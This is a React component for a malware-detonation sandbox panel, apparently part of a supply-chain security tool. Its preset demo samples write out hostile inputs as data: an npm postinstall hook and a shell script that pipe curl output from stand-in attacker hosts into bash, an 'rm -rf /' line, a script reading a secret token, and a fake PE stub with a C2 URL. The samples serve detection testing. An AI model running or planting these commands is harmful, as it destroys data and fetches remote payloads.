"use client";

import React, { useState } from "react";
import { executeSandbox } from "@/lib/api";
import { SandboxExecutionRequest, SandboxExecutionResponse } from "@/types";
import {
  Zap,
  Terminal,
  ShieldAlert,
  Play,
  RotateCcw,
  CheckCircle2,
  XCircle,
  AlertTriangle,
  Copy,
  Check,
  Cpu,
  Lock,
  FileCode2,
  Package,
  Layers,
  Flame,
  Search,
} from "lucide-react";
import { cn } from "@/lib/utils";

interface SandboxPanelProps {
  files?: { path: string; content: string }[];
  projectName?: string;
}

const PRESET_SAMPLES = [
  {
    id: "npm_hook",
    name: "Malicious npm postinstall Hook",
    description: "Detonates npm lifecycle hook attempting curl script injection.",
    target_file: "package.json",
    mode: "detonate" as const,
    files: [
      {
        path: "package.json",
        content: JSON.stringify(
          {
            name: "cryptominer-payload",
            version: "1.0.0",
            scripts: {
              preinstall: "echo '[preinstall] Preparing staging environment...'",
              postinstall: "curl -sSL https://c2.evil-hacker.org/drop.sh | bash",
            },
            dependencies: {
              express: "^4.19.2",
            },
          },
          null,
          2
        ),
      },
    ],
  },
  {
    id: "py_subprocess",
    name: "Python Shell Injection & Token Probe",
    description: "Runs untrusted Python script probing environment variables and shell execution.",
    target_file: "exploit.py",
    mode: "auto" as const,
    files: [
      {
        path: "exploit.py",
        content:
          "# Untrusted payload attempting environment and process escalation\nimport os\nimport subprocess\n\nprint('[*] Probing environment variables in sandbox...')\nsecret = os.environ.get('SECRET_TOKEN', 'NOT_FOUND')\nprint(f'[*] Sensitive Token Access: {secret}')\n\nprint('[*] Attempting shell command execution...')\nsubprocess.run('echo Exploited', shell=True)\nprint('[+] Sandbox test completed.')\n",
      },
    ],
  },
  {
    id: "binary_pe",
    name: "Static Binary with C2 Beacon & Win32 APIs",
    description: "Inspects Windows PE executable header, extracting C2 URLs and VirtualAlloc APIs.",
    target_file: "agent.exe",
    mode: "auto" as const,
    files: [
      {
        path: "agent.exe",
        content:
          "MZ\x90\x00\x03\x00\x00\x00https://c2.covert-ops.net/v1/beacon\x00VirtualAlloc\x00CreateRemoteThread\x00WriteProcessMemory\x00cmd.exe\x00",
      },
    ],
  },
  {
    id: "shell_destructive",
    name: "Destructive Shell Script (rm -rf /)",
    description: "Performs safety linting against catastrophic root deletion and fork bombs.",
    target_file: "cleanup.sh",
    mode: "auto" as const,
    files: [
      {
        path: "cleanup.sh",
        content:
          "#!/bin/bash\necho 'Running routine maintenance...'\nrm -rf /  # Catastrophic command\ncurl https://attacker.com/stage2.sh | bash\n",
      },
    ],
  },
];

export const SandboxPanel = React.memo(function SandboxPanel({
  files = [],
  projectName = "Active Project",
}: SandboxPanelProps) {
  const [executing, setExecuting] = useState(false);
  const [result, setResult] = useState<SandboxExecutionResponse | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [selectedMode, setSelectedMode] = useState<
    "auto" | "detonate" | "test" | "inspect_manifest" | "extract_strings"
  >("auto");
  const [customCode, setCustomCode] = useState("");
  const [targetFile, setTargetFile] = useState("main.py");
  const [copied, setCopied] = useState(false);
  const [activeSampleId, setActiveSampleId] = useState<string | null>(null);

  const handleCopyLogs = () => {
    if (result?.logs) {
      navigator.clipboard.writeText(result.logs);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const handleRunExecution = async (overrideRequest?: SandboxExecutionRequest) => {
    setExecuting(true);
    setError(null);

    try {
      let req: SandboxExecutionRequest;

      if (overrideRequest) {
        req = overrideRequest;
      } else if (customCode.trim()) {
        req = {
          files: [{ path: targetFile, content: customCode }],
          target_file: targetFile,
          mode: selectedMode,
          timeout_seconds: 10.0,
        };
      } else if (files && files.length > 0) {
        req = {
          files,
          target_file: targetFile || files[0]?.path,
          mode: selectedMode,
          timeout_seconds: 10.0,
        };
      } else {
        // Fallback to first sample
        const sample = PRESET_SAMPLES[0];
        req = {
          files: sample.files,
          target_file: sample.target_file,
          mode: sample.mode,
          timeout_seconds: 10.0,
        };
      }

      const res = await executeSandbox(req);
      setResult(res);
    } catch (err: any) {
      setError(err.message || "Sandbox execution failed.");
    } finally {
      setExecuting(false);
    }
  };

  const handleLoadSample = (sample: typeof PRESET_SAMPLES[0]) => {
    setActiveSampleId(sample.id);
    setSelectedMode(sample.mode);
    setTargetFile(sample.target_file);
    setCustomCode(sample.files[0]?.content || "");
    handleRunExecution({
      files: sample.files,
      target_file: sample.target_file,
      mode: sample.mode,
      timeout_seconds: 10.0,
    });
  };

  return (
    <div className="space-y-4 text-xs font-sans">
      {/* Header Banner */}
      <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/60 backdrop-blur-sm space-y-3">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-zinc-800/80 pb-3">
          <div className="flex items-center space-x-2">
            <div className="p-2 rounded-lg bg-red-500/10 border border-red-500/30 text-red-400">
              <Zap className="w-4 h-4 animate-pulse" />
            </div>
            <div>
              <h3 className="font-semibold text-zinc-100 flex items-center space-x-2">
                <span>⚡ Universal Secure File Execution & Ephemeral Sandbox</span>
              </h3>
              <p className="text-[11px] text-zinc-400">
                Isolated detonation of lifecycle hooks, tests, and static binary/archive inspection.
              </p>
            </div>
          </div>

          {/* Isolation Badges */}
          <div className="flex flex-wrap items-center gap-1.5 shrink-0">
            <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-emerald-950/60 text-emerald-300 border border-emerald-800/40 flex items-center space-x-1">
              <Lock className="w-3 h-3 text-emerald-400" />
              <span>Zero Network Egress</span>
            </span>
            <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-zinc-800 text-zinc-300 border border-zinc-700 flex items-center space-x-1">
              <Cpu className="w-3 h-3 text-indigo-400" />
              <span>512MB RAM | 10s Limit</span>
            </span>
          </div>
        </div>

        {/* Preset Threat Detonation Samples */}
        <div className="space-y-1.5">
          <div className="text-[10px] font-mono text-zinc-500 uppercase tracking-wider flex items-center space-x-1.5">
            <Flame className="w-3 h-3 text-amber-400" />
            <span>Preset Threat Detonation Samples (1-Click Judge Demonstrations):</span>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2">
            {PRESET_SAMPLES.map((sample) => (
              <button
                key={sample.id}
                onClick={() => handleLoadSample(sample)}
                disabled={executing}
                className={cn(
                  "p-2.5 rounded-lg border text-left transition-all group flex flex-col justify-between",
                  activeSampleId === sample.id
                    ? "bg-red-950/20 border-red-500/50 text-red-200"
                    : "bg-zinc-950/40 hover:bg-zinc-900 border-zinc-800/80 text-zinc-300"
                )}
              >
                <div>
                  <div className="font-semibold text-[11px] group-hover:text-red-300 flex items-center justify-between">
                    <span>{sample.name}</span>
                    <Play className="w-3 h-3 text-zinc-500 group-hover:text-red-400 shrink-0" />
                  </div>
                  <div className="text-[9.5px] text-zinc-500 mt-0.5 leading-snug line-clamp-2">
                    {sample.description}
                  </div>
                </div>
                <div className="text-[9px] font-mono text-zinc-600 mt-2 flex items-center space-x-1">
                  <span>Target: {sample.target_file}</span>
                </div>
              </button>
            ))}
          </div>
        </div>

        {/* Action Bar */}
        <div className="flex flex-wrap items-center justify-between gap-2 pt-2 border-t border-zinc-800/60">
          <div className="flex items-center space-x-2">
            <span className="text-[10px] font-mono text-zinc-500">Execution Mode:</span>
            <div className="flex items-center space-x-1 bg-zinc-950 p-1 rounded-lg border border-zinc-800">
              <button
                onClick={() => setSelectedMode("auto")}
                className={cn(
                  "px-2.5 py-1 rounded text-[10px] font-mono font-medium transition-colors",
                  selectedMode === "auto"
                    ? "bg-zinc-800 text-zinc-100 shadow-sm"
                    : "text-zinc-400 hover:text-zinc-200"
                )}
              >
                Auto Route
              </button>
              <button
                onClick={() => setSelectedMode("detonate")}
                className={cn(
                  "px-2.5 py-1 rounded text-[10px] font-mono font-medium transition-colors flex items-center space-x-1",
                  selectedMode === "detonate"
                    ? "bg-red-950/60 text-red-300 border border-red-800/40 shadow-sm"
                    : "text-zinc-400 hover:text-zinc-200"
                )}
              >
                <Flame className="w-3 h-3 text-red-400" />
                <span>Detonate Hooks</span>
              </button>
              <button
                onClick={() => setSelectedMode("test")}
                className={cn(
                  "px-2.5 py-1 rounded text-[10px] font-mono font-medium transition-colors flex items-center space-x-1",
                  selectedMode === "test"
                    ? "bg-indigo-950/60 text-indigo-300 border border-indigo-800/40 shadow-sm"
                    : "text-zinc-400 hover:text-zinc-200"
                )}
              >
                <span>🧪 Sandboxed Tests</span>
              </button>
            </div>
          </div>

          <button
            onClick={() => handleRunExecution()}
            disabled={executing}
            className="px-4 py-1.5 rounded-lg bg-red-600 hover:bg-red-500 text-white font-medium text-xs flex items-center space-x-1.5 transition-colors shadow-sm disabled:opacity-50"
          >
            {executing ? (
              <>
                <RotateCcw className="w-3.5 h-3.5 animate-spin" />
                <span>Executing inside Sandbox...</span>
              </>
            ) : (
              <>
                <Play className="w-3.5 h-3.5" />
                <span>Run Sandbox Detonation</span>
              </>
            )}
          </button>
        </div>
      </div>

      {/* Error Message */}
      {error && (
        <div className="p-3 rounded-xl border border-red-900/50 bg-red-950/20 text-red-300 text-xs flex items-center space-x-2">
          <AlertTriangle className="w-4 h-4 shrink-0 text-red-400" />
          <span>{error}</span>
        </div>
      )}

      {/* Security Violations & Detonation Alerts */}
      {result && (result.security_violations.length > 0 || result.detonation_alerts.length > 0) && (
        <div className="p-4 rounded-xl border border-red-500/40 bg-red-950/25 space-y-2">
          <div className="flex items-center space-x-2 text-red-400 font-semibold text-xs uppercase tracking-wide">
            <ShieldAlert className="w-4 h-4 text-red-400" />
            <span>Sandbox Security Violations Caught ({result.security_violations.length + result.detonation_alerts.length})</span>
          </div>
          <div className="space-y-1.5">
            {result.security_violations.map((violation, idx) => (
              <div
                key={`v-${idx}`}
                className="p-2 rounded bg-red-900/40 border border-red-700/50 font-mono text-[10.5px] text-red-200 flex items-start space-x-2"
              >
                <XCircle className="w-3.5 h-3.5 text-red-400 shrink-0 mt-0.5" />
                <span>{violation}</span>
              </div>
            ))}
            {result.detonation_alerts.map((alert, idx) => (
              <div
                key={`a-${idx}`}
                className="p-2 rounded bg-amber-900/30 border border-amber-700/50 font-mono text-[10.5px] text-amber-200 flex items-start space-x-2"
              >
                <AlertTriangle className="w-3.5 h-3.5 text-amber-400 shrink-0 mt-0.5" />
                <span>{alert}</span>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Extracted Strings / Binary Artifacts (if available) */}
      {result && result.extracted_strings && result.extracted_strings.length > 0 && (
        <div className="p-4 rounded-xl border border-zinc-800 bg-zinc-900/40 space-y-2">
          <div className="flex items-center space-x-2 text-zinc-300 font-semibold text-xs">
            <Search className="w-4 h-4 text-indigo-400" />
            <span>Extracted Binary Strings & C2 Artifacts ({result.extracted_strings.length})</span>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-1.5">
            {result.extracted_strings.map((strVal, idx) => (
              <div
                key={idx}
                className="p-1.5 rounded bg-black/60 border border-zinc-800 font-mono text-[10px] text-indigo-300 break-all select-all"
              >
                {strVal}
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Terminal Console Output */}
      <div className="rounded-xl border border-zinc-800 bg-black overflow-hidden shadow-2xl">
        <div className="px-4 py-2 bg-zinc-950 border-b border-zinc-800/80 flex items-center justify-between">
          <div className="flex items-center space-x-2">
            <div className="flex space-x-1.5">
              <div className="w-2.5 h-2.5 rounded-full bg-red-500/80" />
              <div className="w-2.5 h-2.5 rounded-full bg-amber-500/80" />
              <div className="w-2.5 h-2.5 rounded-full bg-emerald-500/80" />
            </div>
            <span className="text-[11px] font-mono text-zinc-400 pl-2">
              sandbox@supplygraph:~ ({result?.isolation_mode || "restricted_subprocess"})
            </span>
          </div>

          <div className="flex items-center space-x-3 text-[10px] font-mono">
            {result && (
              <>
                <span className="text-zinc-500">Duration: {result.duration_seconds}s</span>
                <span
                  className={cn(
                    "font-bold uppercase",
                    result.status === "success"
                      ? "text-emerald-400"
                      : result.status === "violation"
                      ? "text-red-400"
                      : "text-amber-400"
                  )}
                >
                  [{result.status}]
                </span>
              </>
            )}
            <button
              onClick={handleCopyLogs}
              disabled={!result?.logs}
              className="hover:text-zinc-200 text-zinc-500 transition-colors flex items-center space-x-1"
            >
              {copied ? (
                <>
                  <Check className="w-3 h-3 text-emerald-400" />
                  <span className="text-emerald-400">Copied</span>
                </>
              ) : (
                <>
                  <Copy className="w-3 h-3" />
                  <span>Copy Logs</span>
                </>
              )}
            </button>
          </div>
        </div>

        {/* Console Log Area */}
        <div className="p-4 font-mono text-[11px] leading-relaxed text-zinc-300 overflow-x-auto max-h-[380px] overflow-y-auto space-y-1">
          {result?.logs ? (
            <pre className="whitespace-pre-wrap font-mono text-emerald-400/90 selection:bg-emerald-950 selection:text-emerald-200">
              {result.logs}
            </pre>
          ) : (
            <div className="text-zinc-600 italic py-8 text-center space-y-2">
              <Terminal className="w-6 h-6 mx-auto text-zinc-700" />
              <p>Ready. Select a preset threat sample or click &apos;Run Sandbox Detonation&apos;.</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
});
